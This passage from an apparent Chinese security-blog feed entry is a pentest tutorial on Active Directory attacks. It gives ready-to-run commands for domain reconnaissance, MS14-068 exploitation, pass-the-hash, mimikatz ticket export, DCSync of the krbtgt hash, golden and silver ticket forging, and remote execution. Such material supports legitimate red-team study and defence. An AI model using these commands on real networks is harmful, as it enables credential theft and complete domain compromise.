hash注入、IPC登陆 –&gt; hash碰撞；</li><li>在无凭证的条件下使用<code>Responder</code>；</li><li>ARP嗅探/欺骗攻击（Cain和Ettercap）–&gt; 不推荐使用；</li><li>会话劫持；</li><li>最佳助攻 –&gt; 社会工程学；</li><li>待更新….</li></ul><h2 id="四、域环境横向"><a href="#四、域环境横向" class="headerlink" title="四、域环境横向"></a>四、域环境横向</h2><h3 id="（一）域内信息探测"><a href="#（一）域内信息探测" class="headerlink" title="（一）域内信息探测"></a>（一）域内信息探测</h3><ul><li>Windows环境<br>常用命令<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">net user /domain  #查看域用户</span><br><span class="line">net view /domain  #查看有几个域</span><br><span class="line">net view /domain:XXX  #查看此域内电脑</span><br><span class="line">net group /domain  #查询域里面的组</span><br><span class="line">net group &quot;domain computers&quot; /domain  #查看加入到域内的所有计算机名</span><br><span class="line">net group &quot;domain admins&quot; /domain  #查看域管理员</span><br><span class="line">nltest /dclist:xxx  #查看域控制器</span><br><span class="line">net group &quot;domain controllers&quot; /domain  #查看域控制器</span><br><span class="line">net user hacker /domain  #获得指定账户的详细信息</span><br><span class="line">net accounts /domain  #获得域密码策略设置，密码长短，错误锁定等信息</span><br></pre></td></tr></table></figure></li></ul><p>dsquery 命令 查询 AD<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">dsquery computer - 查找目录中的计算机。</span><br><span class="line">dsquery contact - 查找目录中的联系人。</span><br><span class="line">dsquery subnet - 查找目录中的子网。</span><br><span class="line">dsquery group - 查找目录中的组。</span><br><span class="line">dsquery ou - 查找目录中的组织单位。</span><br><span class="line">dsquery site - 查找目录中的站点。</span><br><span class="line">dsquery server - 查找目录中的 AD DC/LDS 实例。</span><br><span class="line">dsquery user - 查找目录中的用户。</span><br><span class="line">dsquery quota - 查找目录中的配额规定。</span><br><span class="line">dsquery partition - 查找目录中的分区。</span><br><span class="line">dsquery * - 用通用的 LDAP 查询来查找目录中的任何对象。</span><br></pre></td></tr></table></figure></p><p>Net系列命令获取域内信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Csvde/ldifde/dsquery/adfind/ldapsearch #探测更详细信息</span><br><span class="line">使用`Get-SPN`（powershell脚本LDAP中快速查询符合指定得用户、组、或者SPN服务名称）</span><br><span class="line">Nslookup -type=SRV_ldap._tcp #(寻找域控)</span><br><span class="line">tasklist /v  #列出进程和进程所有者（看是否有域管登陆）</span><br><span class="line">PowerView #（powershell脚本 辅助找寻定位关键用户，查看域管在线机器）</span><br><span class="line">WinScanX.exe  #远程信息刺探</span><br><span class="line">Winfo.exe  #遍历远程用户名</span><br><span class="line">nmap smb-enum-sessions.nse #（引擎来获取远程机器的登陆session，并且不需要管理权。）</span><br><span class="line">netview.exe`#(它利用`NetSessionEnum`来寻找登陆sessions，利用`NetShareEnum`来找寻共享，利用`NetWkstaUserEnum`来枚举登陆的用户)</span><br></pre></td></tr></table></figure></p><hr><ul><li>linux</li></ul><ol><li><code>cat /etc/nsswitch</code><br>看看密码登陆策略，我可以看到使用了file ldap模式</li><li><code>less /etc/ldap.conf</code><br>base ou=People,dc=unix-center,dc=net<br>找到ou,dc,dc设置</li><li>查找10条用户记录<br><code>ldapsearch -h 192.168.2.2 -x -z 10 -p</code>指定端口</li><li>查看NFS连接<br><code>showmount -e ip</code></li><li>查找管理员信息<br>匿名方式<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -D &quot;cn=administrator,cn=People,dc=unix-center,dc=net&quot; -b &quot;cn=administrator,cn=People,dc=unix-center,dc=net&quot; -h 192.168.2.2</span><br></pre></td></tr></table></figure></li></ol><p>有密码形式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -W -D &quot;cn=administrator,cn=People,dc=unix-center,dc=net&quot; -b &quot;cn=administrator,cn=People,dc=unix-center,dc=net&quot; -h 192.168.2.2</span><br></pre></td></tr></table></figure></p><hr><h3 id="（二）域管权限获取"><a href="#（二）域管权限获取" class="headerlink" title="（二）域管权限获取"></a>（二）域管权限获取</h3><p>除了工作组的那几种方法外，还有专属域环境的渗透方式.</p><h4 id="1、组策略漏洞（GPP）"><a href="#1、组策略漏洞（GPP）" class="headerlink" title="1、组策略漏洞（GPP）"></a>1、组策略漏洞（GPP）</h4><p>域管理员使用GPP来配置和操作域，常见的操作有远程创建本地用户、映射打印机、映射磁盘等，这些操作有时候需要提供账号密码。当组策略进行分发时，会在<code>SYSVOL</code>目录下生成一个xml文件，理所当然的前面提供的账号密码都保存在这个xml文件中，而密码是经过AES加密得，也就是说完全可逆的加密算法，而微软同时也很照顾的公布了加密密钥，所以任何域普通用户就可以读取这些xml文件并使用公开的AES密钥破解密码。组策略漏洞是windows 2008的，而且不一定是groups.xml，其他的xml也可能存在密码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\domain.com\sysvol\*</span><br></pre></td></tr></table></figure><h4 id="2、KERBEROS协议漏洞"><a href="#2、KERBEROS协议漏洞" class="headerlink" title="2、KERBEROS协议漏洞"></a>2、KERBEROS协议漏洞</h4><p>常见的三种共计方法：<code>MS14-068</code>，<code>Golden ticket（黄金票据）</code>，<code>SILVER TICKET（白银票据）</code></p><p>简单介绍下<code>Kerberos</code>协议的工作方法：</p><ul><li>客户机将明文密码进行ntlm哈希,然后和时间戳一起加密(使用krbtgt密码hash作为密钥)，发送给kdc（域控）,kdc对用户进行检测，成功之后创建TGT(Ticket-Granting Ticket)</li><li>将TGT进行加密签名返回给客户机器，只有域用户krbtgt才能读取kerberos中tgt数据</li><li>然后客户机将tgt发送给域控制器KDC请求TGS（票证授权服务）票证，并且对tgt进行检测</li><li>检测成功之后，将目标服务账户的ntlm以及tgt进行加密，将加密后的结果返回给客户机。</li></ul><h5 id="（1）ms14-068"><a href="#（1）ms14-068" class="headerlink" title="（1）ms14-068"></a>（1）ms14-068</h5><p><code>Benjamin Delpy</code>(Mimikatz的作者)写了一个MS14-068的利用工具，叫Kekeo,是PyKEX的升级版。它能够找到并定位有漏洞的域控，在打了补丁（KB3011780）和有2012/2012R2域控得情况下仍能凑效。</p><p>在利用<code>MS14-068</code>之前，建议先使用<code>klist /purge</code>清除服务器端缓存的Kerberos凭据，且使用域控地址不使用IP。</p><ul><li><p>PyKEK</p><ul><li>准备条件</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">域用户及其口令 （攻击主机可使用其他域用户信息，比如可以在主机A上用域用户B的口令及sid攻击）</span><br><span class="line">域用户对应sid （whoami /all）</span><br><span class="line">域控地址</span><br><span class="line">操作系统要求Win7及以上，这是因为XP不支持导入Ticket</span><br></pre></td></tr></table></figure><ul><li>利用方法:</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ms14-068.exe -u -p -s -d  # 生成vuln.ccache</span><br><span class="line">klist /purge  # 清除内存中的Ticket</span><br><span class="line">kerberos::ptc vuln.ccache  # 导入vuln.ccache</span><br><span class="line">klist # 查看是否导入</span><br></pre></td></tr></table></figure></li><li><p>Kekeo</p><ul><li>Kekeo快捷用法仅需要以下参数（使用方法）：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">域用户及其口令</span><br><span class="line">域控地址</span><br><span class="line">ms14068.exe /domain:vuln.local /user:utilisateur /password:waza1234/ /ptt</span><br></pre></td></tr></table></figure><ul><li>下载地址：<a href="https://github.com/gentilkiwi/kekeo/releases" target="_blank" rel="noopener">https://github.com/gentilkiwi/kekeo/releases</a></li></ul></li></ul><p>#####（2）另外两种作为权限固守使用</p><h4 id="3、相同密码登陆（hash碰撞）"><a href="#3、相同密码登陆（hash碰撞）" class="headerlink" title="3、相同密码登陆（hash碰撞）"></a>3、相同密码登陆（hash碰撞）</h4><p>hash碰撞实际上就是利用hash传递来盲打。</p><p>如果内网主机的本地管理员账户密码相同且允许本地账户登陆域内其他机器。</p><p>在域环境中，利用<code>pass the hash</code>的渗透方式往往是这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.获得一台域主机权限；</span><br><span class="line">2.Dump内存获取用户hash（或明文）；</span><br><span class="line">3.通过pass the hash 或 pass the ticket尝试登陆其他主机；</span><br><span class="line">4.继续收集hash或明文，并尝试远程登陆；</span><br><span class="line">5.知道获得域管理员hash，登陆域控，最终成功控制整个域。</span><br></pre></td></tr></table></figure><p>域登陆缓存mscash<br>使用reg命令提取sam、system、securit，然后用creddump7或者mimakatz提取mscash。</p><h4 id="4、利用漏洞配置不当获取更多主机权限"><a href="#4、利用漏洞配置不当获取更多主机权限" class="headerlink" title="4、利用漏洞配置不当获取更多主机权限"></a>4、利用漏洞配置不当获取更多主机权限</h4><ol><li>常见应用漏洞：<br><code>struts2、zabbix、axis、ImageMagic、fastcgi、Shellshock、redis未授权访问、Hadoop、weblogic、jboss、WebSphere、Coldfusion</code></li><li>常见语言反序列化漏洞<br><code>php、Java、python、ruby、node.js</code></li><li>数据库漏洞及配置不当<br>mssql Get-SQLServerAccess、MySQL低版本hash登陆、MySQL低版本Authentication Bypass、域内mssql凭证获取密码、monggodb未授权访问、memcache配置不当</li><li>内网中很多web应用存在常见漏洞、使用有漏洞的中间件和框架、弱口令及配置不当（注入、任意文件读取、备份、源码泄漏（rsync、git、svn、DS_Store）、代码执行、xss、弱口令、上传漏洞、权限绕过…）</li><li>web应用、及数据库中寻找其他服务器密码信息（<code>ftp、mail、smb、ldap存储、sql...</code>）</li><li>系统备份文件（<code>ghost</code>）中读密码</li><li>在已有控制权限主机中，查看各<code>浏览器书签</code>、<code>cookie</code>、<code>存储密码</code>、<code>键盘记录</code>收集相关敏感信息、查询<code>注册表</code>中保存密码、读取各客户端连接密码、putty dll注入、putty密码截取、ssh连接密码，以获取更多主机权限<br>推荐工具：<code>NetRipper</code>、<code>Puttyrider.exe</code>、<code>ProwserPasswordDump.exe</code>、<code>LaZagne.exe</code></li><li><code>ms08-067</code>远程溢出（极少能碰到）</li><li><code>cmdkey /list</code> 远程终端可信任连接连接<code>netpass.exe</code>读取该密码</li><li>arp欺骗中间人攻击（替换sql数据包、认证凭证获取、密码获取极大不到万不得已不会用）</li><li><code>WPAD中间人攻击</code>（全称网络代理自动发现协议、截获凭证该种方法不需要ARP欺骗，比较好用的一种方法（使用Responder.py/net-creds.py））</li><li>翻阅相关文件及以控制数据库中可能存储配置口令（别忘了回收站）</li><li>用已有控制权限的邮箱账号以及前期所了解到的信息进行欺骗（社会工程学）</li><li>定向浏览器信息ip信息定向挂马（0day）</li><li>用以收集的密码（组合变换密码）对各服务进行爆破</li><li>应用0day攻击…</li></ol><hr><h4 id="5、远程命令执行方式"><a href="#5、远程命令执行方式" class="headerlink" title="5、远程命令执行方式"></a>5、远程命令执行方式</h4><p>例如<code>at\schtasks\psexec\wmic\sc\ps</code>网上有很多相关资源也不占篇幅了，只提一个很少提的。从2012r2 起，他们开了一个端口叫<code>5985</code>，原理跟大家常说的powershell remote是一样的，基于winrm服务，于是可以这样执行。又是一个系统自带的远程管理工具。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:192.168.22.33 -u:administrator -p:p@assw0rd ipconfig</span><br></pre></td></tr></table></figure></p><h3 id="（三）目标定位"><a href="#（三）目标定位" class="headerlink" title="（三）目标定位"></a>（三）目标定位</h3><p>在有域控权限的条件下，需要找到某台机器（服务器、个人机、数据库）</p><p>我们首先先将所有的域用户的详细信息都列举出来，通过详细名称（Full Name）确认其域用户。<br><a href="http://rcoil.me/2018/08/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91-%E6%89%B9%E9%87%8FNet-User/">【域渗透】批量Net-User</a>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dsquery user - 查找目录中的用户。</span><br><span class="line">dsquery computer - 查找目录中的计算机。</span><br></pre></td></tr></table></figure></p><p>我们将上面的两条命令的执行结果结合起来进行归类。<br>然后通过域控日志查找登陆IP或者机器。当然，除了日志还有别的方式，不限于日志。<br><a href="http://rcoil.me/2018/11/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E8%8E%B7%E5%8F%96%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%86%85%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF/">【域渗透】获取域环境内用户登录信息</a><br>找到机器或者IP之后，可通过域管理员或者用其域用户进行登陆。登陆的方式也是有多重，上面有讲过。</p><p>但是，也有些机器是登陆不上的。我们可以通过设置域登陆脚本进行操作。<br><a href="http://rcoil.me/2018/11/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E5%9C%A8%E5%9F%9F%E6%8E%A7%E4%B8%8A%E4%BD%BF%E7%94%A8cmd%E6%9B%B4%E6%94%B9%E5%9F%9F%E7%94%A8%E6%88%B7%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E7%99%BB%E5%BD%95%E8%84%9A%E6%9C%AC/">【域渗透】在域控上使用cmd更改域用户配置文件中的登录脚本</a></p><p>后续待更新、、、</p><hr><h2 id="五、权限维持"><a href="#五、权限维持" class="headerlink" title="五、权限维持"></a>五、权限维持</h2><h3 id="（一）Pass-The-Ticket"><a href="#（一）Pass-The-Ticket" class="headerlink" title="（一）Pass The Ticket"></a>（一）Pass The Ticket</h3><p>获取权限后可使用<code>wmic.vbs</code>进行操作。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript wmiexec.vbs /shell dc-01.vuln.local</span><br></pre></td></tr></table></figure><h4 id="1、Export-the-ticket"><a href="#1、Export-the-ticket" class="headerlink" title="1、Export the ticket"></a>1、Export the ticket</h4><p>在我们成功获得域控权限后，就可以导出域控内存中的<code>Ticket</code>，在默认的10个小时以内都可以利用来登录域控。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # sekurlsa::tickets /export  # 导出Ticket</span><br><span class="line">mimikatz &quot;kerberos::ptt C:\test\[0;2d87a]-2-0-40e00000-a@krbtgt-Vuln.LOCAL.kirbi&quot; # 在普通域用户机器上执行</span><br></pre></td></tr></table></figure><p>Tips：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">64位系统使用ptt功能要用32位的mimikatz，如果用64的mimikatz，那么无法导入Ticket</span><br><span class="line">这种方式导入的Ticket默认在10小时以内生效</span><br></pre></td></tr></table></figure><h4 id="2、Golden-Ticket（黄金票据）"><a href="#2、Golden-Ticket（黄金票据）" class="headerlink" title="2、Golden Ticket（黄金票据）"></a>2、Golden Ticket（黄金票据）</h4><p><code>Golden Ticket</code>是伪造的<code>TGT(Ticket Granting Ticket)</code>–&gt;票据授权票据，所以可以获取任何Kerberos服务权限。</p><p>每个用户的<code>Ticket</code>都是由<code>krbtgt</code>用户的密码Hash来生成的，如果我们拿到了<code>Krbtgt</code>的密码Hash，就可以随意伪造<code>Ticket</code>。</p><h5 id="（1）导出krbtgt的Hash"><a href="#（1）导出krbtgt的Hash" class="headerlink" title="（1）导出krbtgt的Hash"></a>（1）导出krbtgt的Hash</h5><p>在域控上执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!bash</span><br><span class="line">mimikatz log &quot;lsadump::dcsync /domain:vuln.local /user:krbtgt&quot;</span><br></pre></td></tr></table></figure><p>生成<code>mimikatz.log</code>记录输出，使用log输出是为了方便复制Hash值</p><p>提取所需信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/domain：test.local</span><br><span class="line">/sid:S-1-5-21-4155807533-xxxxxx-2767329826 </span><br><span class="line">/aes256:af71a24ea463446f9b4c645e1bfexxxxxx70c7d785df10acf008xxxxxx5e682f</span><br></pre></td></tr></table></figure><h5 id="（2）生成Golden-Ticket"><a href="#（2）生成Golden-Ticket" class="headerlink" title="（2）生成Golden Ticket"></a>（2）生成Golden Ticket</h5><p>伪造的用户设置为test，执行以下命令生成文件<code>gold.kirbi</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;kerberos::golden /domain:vuln.local /sid:S-1-5-21-4155807533-xxxxxx-2767329826 </span><br><span class="line">/aes256:af71a24ea463446f9b4c645e1bfexxxxxx70c7d785df10acf008xxxxxx5e682f /user:test </span><br><span class="line">/ticket:test.kirbi&quot;</span><br></pre></td></tr></table></figure><p>Tips：生成<code>Golden Ticket</code>不仅可以使用<code>aes256</code>，也可用<code>krbtgt</code>的<code>NTLM hash</code></p><h5 id="（3）导入Golden-Ticket"><a href="#（3）导入Golden-Ticket" class="headerlink" title="（3）导入Golden Ticket"></a>（3）导入Golden Ticket</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt test.kirbi</span><br></pre></td></tr></table></figure><p>Tips:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这种方式导入的Ticket默认在20分钟以内生效，当然，如果过期了，再次ptt导入Golden Ticket就好</span><br><span class="line">可以伪造任意用户，即使其不存在</span><br><span class="line">krbtgt的NTLM hash不会轻易改变，即使修改域控管理员密码</span><br></pre></td></tr></table></figure><h4 id="3、Silver-Ticket（白银票据）"><a href="#3、Silver-Ticket（白银票据）" class="headerlink" title="3、Silver Ticket（白银票据）"></a>3、Silver Ticket（白银票据）</h4><p><code>Silver Ticket</code>是伪造的<code>TGS(Ticket Granting Server)</code>–&gt;票据授权服务器，所以也叫<code>service ticket</code>，只能访问指定的服务权限。</p><ul><li>比如现在要访问域控上的<code>cifs</code>服务（cifs服务用于Windows主机间的文件共享）</li></ul><h5 id="（1）所需条件"><a href="#（1）所需条件" class="headerlink" title="（1）所需条件"></a>（1）所需条件</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/domain</span><br><span class="line">/sid</span><br><span class="line">/target:目标服务器的域名全称，此处为域控的全称</span><br><span class="line">/service：目标服务器上面的kerberos服务，此处为cifs</span><br><span class="line">/rc4：计算机账户的NTLM hash，域控主机的本地计算机账户</span><br><span class="line">/user：要伪造的用户名，此处可用silver测试</span><br></pre></td></tr></table></figure><h5 id="（2）使用方法"><a href="#（2）使用方法" class="headerlink" title="（2）使用方法"></a>（2）使用方法</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;kerberos::golden /domain:vuln.local /sid:S-1-5-21-4155807533-921486164-2767329826 /target:dc-01.vuln.local /service:cifs /rc4:d5304f9ea69523479560ca4ebb5a2155 /user:silver /ptt&quot;</span><br></pre></td></tr></table></figure><p>成功导入，就可以访问域控上的文件共享。</p><ul><li><p>如果要访问域控上的<code>LDAP</code>服务</p><p>只需要把/service的名称改为LDAP，/user改为krbtgt，/rc4改为krbtgt的NTLM HASH</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;kerberos::golden /domain:vuln.local /sid:S-1-5-21-4155807533-xxxxxx-2767329826  /target:dc-01.vuln.local /service:LDAP /rc4:d5304f9ea69523479xxxxxxebb5a2155 /user:krbtgt /ptt&quot;</span><br></pre></td></tr></table></figure><p>导入成功，但是无法访问域控的文件共享服务，因为范围有限，只能访问指定的服务权限。</p><p>但是，执行以下命令可以远程访问<code>LDAP服务</code>来获得<code>krbtgt</code>的信息:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;lsadump::dcsync /dc:dc-01.vuln.local /domain:vuln.local /user:krbtgt&quot;</span><br></pre></td></tr></table></figure><p>所以可以获取任何Kerberos服务权限。</p><p>注：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync</span><br><span class="line">向 DC 发起一个同步对象（可获取帐户的密码信息）的质询。</span><br><span class="line">需要的权限包括管理员组（Administrators），域管理员组（ Domain Admins）或企业管理员组（Enterprise Admins）以及域控制器的计算机帐户</span><br><span class="line">只读域控制器默认不允许读取用户密码数据</span><br></pre></td></tr></table></figure><p>参数选项：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/user - 要查询的用户id 或 SID</span><br><span class="line">/domain（可选的）默认设置为当前域。</span><br><span class="line">/dc（可选的）指定DCSync 连接的域控位置</span><br></pre></td></tr></table></figure><p>当然还有其他可作<code>Silver Ticket</code>的服务</p></li></ul><h3 id="（二）三好学生师傅的文章"><a href="#（二）三好学生师傅的文章" class="headerlink" title="（二）三好学生师傅的文章"></a>（二）三好学生师傅的文章</h3><p><a href="https://wooyun.x10sec.org/static/drops/tips-12518.html" target="_blank" rel="noopener">域渗透——Security Support Provider</a></p><p><a href="https://wooyun.x10sec.org/static/drops/tips-12670.html" target="_blank" rel="noopener">域渗透——Skeleton Key</a></p><p><a href="https://wooyun.x10sec.org/static/drops/tips-13079.html" target="_blank" rel="noopener">域渗透——Hook PasswordChangeNotify</a></p><p>….</p><h3 id="（三）域内配置ACL后门及检测清理"><a href="#（三）域内配置ACL后门及检测清理" class="headerlink" title="（三）域内配置ACL后门及检测清理"></a>（三）域内配置ACL后门及检测清理</h3><h3 id="（四）windows后门种植方式收集"><a href="#（四）windows后门种植方式收集" class="headerlink" title="（四）windows后门种植方式收集"></a>（四）windows后门种植方式收集</h3><hr><h1 id="0x05-整合参考"><a href="#0x05-整合参考" class="headerlink" title="0x05 整合参考"></a>0x05 整合参考</h1><p>更多资料请参考以下文章</p><p><a href="https://mp.weixin.qq.com/s?__biz=MzIxNTQxMjQyNg==&amp;mid=2247484247&amp;idx=1&amp;sn=ca9f7fd6ca95000b2b41b13a0a356ede&amp;chksm=9799f8f2a0ee71e44ca01c49c4f9d5a7e222e822608de9e27941272f445600e40e6c7406e94f&amp;mpshare=1&amp;scene=23&amp;srcid=06167UJn60EzUeiDU2pmwqk8#rd" target="_blank" rel="noopener">黑客游走于企业windows内网的几种姿势</a></p><p><a href="http://bobao.360.cn/learning/detail/3204.html" target="_blank" rel="noopener">内网渗透——网络环境的判断</a></p><p><a href="https://www.freebuf.com/vuls/56081.html" target="_blank" rel="noopener">深入解读MS14-068漏洞：微软精心策划的后门？</a></p><p><a href="http://xnianq.cn/2018/10/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" target="_blank" rel="noopener">域渗透之横向移动</a></p><p><a href="https://wooyun.x10sec.org/static/drops/tips-11631.html" target="_blank" rel="noopener">域渗透——Pass The Hash &amp; Pass The Key</a></p><p><a href="http://xnianq.cn/2018/07/23/windows%E5%90%8E%E9%97%A8%E7%A7%8D%E6%A4%8D%E6%96%B9%E5%BC%8F%E6%94%B6%E9%9B%86/" target="_blank" rel="noopener">windows后门种植方式收集</a></p><p><a href="https://wooyun.x10sec.org/static/drops/tips-12159.html" target="_blank" rel="noopener">域渗透——Pass The Ticket</a></p><p><a href="https://adsecurity.org/?p=2011" target="_blank" rel="noopener">How Attackers Use Kerberos Silver Tickets to Exploit Systems</a></p><p><a href="https://www.freebuf.com/articles/system/189942.html" target="_blank" rel="noopener">域内配置ACL后门及检测清理</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;内网渗透，最重要得是定位问题。所以前期的调研和收集是非常重要的一项工作。&lt;br&gt;标：本文多数内容是整合的知识点。&lt;br&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="Web安全" scheme="https://rcoil.me/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="内网" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91/"/>
    
      <category term="系统安全" scheme="https://rcoil.me/tags/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
      <category term="后门" scheme="https://rcoil.me/tags/%E5%90%8E%E9%97%A8/"/>
    
  </entry>
  
</feed>
